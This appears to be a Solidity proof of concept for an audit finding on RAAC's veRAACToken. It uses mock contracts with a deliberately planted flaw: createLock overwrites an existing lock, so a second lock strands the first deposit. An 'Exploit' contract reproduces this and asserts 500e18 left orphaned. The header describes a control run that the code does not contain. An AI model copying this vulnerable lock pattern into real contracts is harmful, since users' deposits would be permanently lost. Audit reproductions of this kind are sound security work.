// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC veRAACToken — Codehawks, finding 57158 (Feb 2025)
    LockManager.createLock writes locks[user] without reading the old amount.
    A second lock() pulls more RAAC and replaces the record. withdraw() later
    pays only the new amount. The first deposit stays in the contract with no
    owner. This run locks 500e18, overwrites with 200e18, and withdraws 200e18.
    500e18 remains in veRAACToken. The control uses increase() and withdraws 700e18.
*/

contract RaacToken {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LockManager {
    struct Lock {
        uint256 amount;
        uint256 end;
        bool exists;
    }

    mapping(address => Lock) public locks;
    uint256 public totalLocked;

    function createLock(address user, uint256 amount, uint256 duration) external returns (uint256 end) {
        end = block.timestamp + duration;
        // @> VULN: createLock overwrites locks[user] and never returns the RAAC already locked
        locks[user] = Lock({amount: amount, end: end, exists: true});
        totalLocked += amount;
    }

    function increase(address user, uint256 amount) external {
        Lock memory existing = locks[user];
        require(existing.exists, "no lock");
        locks[user].amount = existing.amount + amount;
        totalLocked += amount;
    }

    function clear(address user, uint256 amount) external {
        locks[user].amount = 0;
        locks[user].exists = false;
        totalLocked -= amount;
    }
}

contract VeRAACToken {
    RaacToken public token;
    LockManager public manager;

    constructor(RaacToken _token, LockManager _manager) {
        token = _token;
        manager = _manager;
    }

    function lock(uint256 amount, uint256 duration) external {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        manager.createLock(msg.sender, amount, duration);
    }

    function increase(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        manager.increase(msg.sender, amount);
    }

    function withdraw() external {
        (uint256 amount, uint256 end, bool exists) = manager.locks(msg.sender);
        require(exists, "none");
        require(block.timestamp >= end, "time");
        manager.clear(msg.sender, amount);
        require(token.transfer(msg.sender, amount), "pay");
    }
}

contract Exploit {
    RaacToken public token;
    LockManager public manager;
    VeRAACToken public ve;
    uint256 public recovered;
    uint256 public stranded;

    constructor() {
        token = new RaacToken();
        manager = new LockManager();
        ve = new VeRAACToken(token, manager);
        token.mint(address(this), 1000 ether);
        token.approve(address(ve), type(uint256).max);
    }

    function run() external {
        uint256 start = token.balanceOf(address(this));
        ve.lock(500 ether, 0);
        uint256 afterFirst = token.balanceOf(address(ve));
        ve.lock(200 ether, 0);
        (uint256 recorded,,) = manager.locks(address(this));
        uint256 afterSecond = token.balanceOf(address(ve));
        ve.withdraw();
        recovered = token.balanceOf(address(this)) - (start - 700 ether);
        stranded = token.balanceOf(address(ve));
        require(afterFirst == 500 ether, "first");
        require(recorded == 200 ether, "overwritten");
        require(afterSecond == 700 ether, "both");
        require(recovered == 200 ether, "paid");
        require(stranded == 500 ether, "stranded");
        require(token.balanceOf(address(this)) == 500 ether, "user");
        require(manager.totalLocked() == 500 ether, "orphan");
    }
}
